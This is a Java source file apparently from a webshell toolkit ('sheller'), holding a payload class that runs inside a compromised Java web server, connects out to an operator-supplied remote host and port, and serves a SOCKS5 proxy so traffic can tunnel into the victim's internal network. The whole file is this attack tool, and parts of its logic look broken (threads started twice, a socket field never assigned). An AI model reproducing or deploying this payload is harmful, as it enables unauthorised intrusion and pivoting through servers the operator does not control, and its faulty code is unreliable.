package vip.youwe.sheller.payload.java;

import vip.youwe.sheller.utils.CipherUtils;

import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.*;
import java.nio.channels.SocketChannel;

public class RemoteSocksProxy implements Runnable {

    public static String action;
    public static String remoteIP;
    public static String remotePort;
    private ServletRequest Request;
    private ServletResponse Response;
    private HttpSession Session;

    public RemoteSocksProxy(Socket socket, String threadType, HttpSession session) {
        this.listenPort = 5555;
        this.bufSize = 65535;
        this.outerSocket = socket;
        this.threadType = threadType;
        this.Session = session;
    }

    private Socket outerSocket;
    private Socket innerSocket;
    private Socket serverInnersocket;
    private Socket targetSocket;
    private int listenPort;
    private String threadType;
    private int bufSize;

    public RemoteSocksProxy(String threadType, HttpSession session) {
        this.listenPort = 5555;
        this.bufSize = 65535;
        this.threadType = threadType;
        this.Session = session;
    }

    public RemoteSocksProxy(Socket outerSocket, String threadType, Socket innerSocket) {
        this.listenPort = 5555;
        this.bufSize = 65535;
        this.outerSocket = outerSocket;
        this.innerSocket = innerSocket;
        this.threadType = threadType;
    }

    public RemoteSocksProxy() {
        this.listenPort = 5555;
        this.bufSize = 65535;
    }

    public boolean equals(Object obj) {
        return false;
    }


    public void run() {
        if (action.equals("create")) {

            try {
                ServerSocket serverSocket = new ServerSocket(this.listenPort, 50);
                this.Session.setAttribute("socks_server_" + this.listenPort, serverSocket);
                serverSocket.setReuseAddress(true);
                (new Thread(new RemoteSocksProxy("link", this.Session))).start();
                while (true) {
                    Socket serverInnersocket = serverSocket.accept();
                    this.Session.setAttribute("socks_server_inner_" + serverInnersocket.getInetAddress().getHostAddress() + "_" + serverInnersocket.getPort(), serverInnersocket);
                    (new Thread(new RemoteSocksProxy(serverInnersocket, "session", this.Session))).start();
                }
            } catch (IOException iOException) {
            }
        }

        if (action.equals("link")) {
            try {
                SocketChannel outerSocketChannel = SocketChannel.open();
                outerSocketChannel.connect(new InetSocketAddress(remoteIP, Integer.parseInt(remotePort)));
                String outerKey = "socks_outer_" + outerSocketChannel.socket().getLocalPort() + "_" + remoteIP + "_" + remotePort;
                this.Session.setAttribute(outerKey, outerSocketChannel);

                SocketChannel innerSocketChannel = SocketChannel.open();
                innerSocketChannel.connect(new InetSocketAddress("127.0.0.1", this.listenPort));
                String innerKey = "socks_inner_" + innerSocketChannel.socket().getLocalPort();
                this.Session.setAttribute(innerKey, innerSocketChannel);
            } catch (IOException iOException) {
            }

        } else if (action.equals("session")) {
            try {
                if (handleSocks(this.serverInnersocket)) {
                    Thread reader = new Thread(new RemoteSocksProxy(this.serverInnersocket, "read", this.Session));
                    reader.start();
                    Thread writer = new Thread(new RemoteSocksProxy(this.serverInnersocket, "write", this.Session));
                    writer.start();

                    reader.start();
                    writer.start();
                    reader.join();
                    writer.join();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }

        } else if (action.equals("read")) {
            while (this.outerSocket != null) {
                try {
                    byte[] buf = new byte[512];
                    int bytesRead = this.innerSocket.getInputStream().read(buf);
                    while (bytesRead > 0) {
                        this.outerSocket.getOutputStream().write(buf, 0, bytesRead);
                        this.outerSocket.getOutputStream().flush();
                        bytesRead = this.innerSocket.getInputStream().read(buf);
                    }

                } catch (Exception e) {
                    e.printStackTrace();
                }
                try {
                    this.innerSocket.close();
                    this.outerSocket.close();
                } catch (Exception e) {

                    e.printStackTrace();
                }

            }
        } else if (action.equals("write")) {
            while (this.outerSocket != null) {
                try {
                    this.outerSocket.setSoTimeout(1000);
                    byte[] data = new byte[this.bufSize];
                    int length = this.outerSocket.getInputStream().read(data);
                    if (length == -1)
                        break;
                    this.innerSocket.getOutputStream().write(data, 0, length);
                    this.innerSocket.getOutputStream().flush();
                } catch (SocketTimeoutException e) {

                } catch (Exception e) {
                    e.printStackTrace();
                    break;
                }
            }
            try {
                this.innerSocket.close();
                this.outerSocket.close();
            } catch (Exception e) {

                e.printStackTrace();
            }
        }
    }

    private boolean handleSocks(Socket socket) throws Exception {
        int ver = socket.getInputStream().read();
        if (ver == 5)
            return parseSocks5(socket);
        if (ver == 4) {
            return parseSocks4(socket);
        }
        return false;
    }

    private boolean parseSocks5(Socket socket) throws Exception {
        int atyp, cmd;
        DataInputStream ins = new DataInputStream(socket.getInputStream());
        DataOutputStream os = new DataOutputStream(socket.getOutputStream());
        int nmethods = ins.read();
        int methods = ins.read();
        os.write(new byte[]{5, 0});
        int version = ins.read();
        if (version == 2) {
            version = ins.read();
            cmd = ins.read();
            int rsv = ins.read();
            atyp = ins.read();
        } else {
            cmd = ins.read();
            int rsv = ins.read();
            atyp = ins.read();
        }

        byte[] targetPort = new byte[2];
        String host = "";

        if (atyp == 1) {
            byte[] target = new byte[4];
            ins.readFully(target);
            ins.readFully(targetPort);
            String[] tempArray = new String[4];
            for (int i = 0; i < target.length; i++) {
                int temp = target[i] & 0xFF;
                tempArray[i] = temp + "";
            }

            for (String temp : tempArray) {
                host = host + temp + ".";
            }
            host = host.substring(0, host.length() - 1);
        } else if (atyp == 3) {
            int targetLen = ins.read();
            byte[] target = new byte[targetLen];
            ins.readFully(target);
            ins.readFully(targetPort);
            host = new String(target);
        } else if (atyp == 4) {
            byte[] target = new byte[16];
            ins.readFully(target);
            ins.readFully(targetPort);
            host = new String(target);
        }
        int port = (targetPort[0] & 0xFF) * 256 + (targetPort[1] & 0xFF);
        if (cmd == 2 || cmd == 3)
            throw new Exception("not implemented");
        if (cmd == 1) {
            host = InetAddress.getByName(host).getHostAddress();

            try {
                SocketChannel targetSocketChannel = SocketChannel.open();
                targetSocketChannel.connect(new InetSocketAddress(host, port));
                String innerKey = "socks_target_" + targetSocketChannel.socket().getLocalPort() + "_" + host + "_" + port;
                this.Session.setAttribute(innerKey, targetSocketChannel);
                os.write(CipherUtils.mergeByteArray(new byte[][]{{5, 0, 0, 1
                }, InetAddress.getByName(host).getAddress(), targetPort}));
                return true;
            } catch (Exception e) {

                os.write(CipherUtils.mergeByteArray(new byte[][]{{5, 0, 0, 1
                }, InetAddress.getByName(host).getAddress(), targetPort}));
                throw new Exception(String.format("[%s:%d] Remote failed", new Object[]{host, Integer.valueOf(port)}));
            }
        }

        throw new Exception("Socks5 - Unknown CMD");
    }


    private boolean parseSocks4(Socket socket) throws Exception {
        return false;
    }
}
